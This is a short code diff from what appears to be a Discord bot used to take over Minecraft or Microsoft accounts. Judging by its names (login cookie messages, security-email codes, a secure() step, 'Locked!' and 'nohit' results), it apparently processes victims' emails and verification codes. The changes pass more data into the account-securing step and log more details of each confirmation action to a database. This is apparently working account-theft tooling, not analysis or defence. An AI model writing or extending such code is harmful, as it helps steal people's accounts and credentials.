@@ -173,7 +173,7 @@ let obj = {
                 await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, code, uid, true);
               }
 
-              let acc = await secure(host, settings, uid);
+              let acc = await secure(host, settings, uid, mcname);
 
               if (acc.email === "Locked!") {
                 nohit = true;
@@ -307,7 +307,7 @@ let obj = {
       let secDisplay = secEmail.display || secEmail.data || secEmail;
       let secData = secEmail.data || secEmail.display || secEmail;
 
-      await client.queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `confirmcode|${email}|${secDisplay}|${secData}|${mcname}`]);
+      await client.queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `confirmcode|${email}|${secDisplay}|${secData}|${mcname}|${interaction.user.id}|${client.username}|${client.botnumber}`]);
 
       const messagePromises = [
         secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, secDisplay)
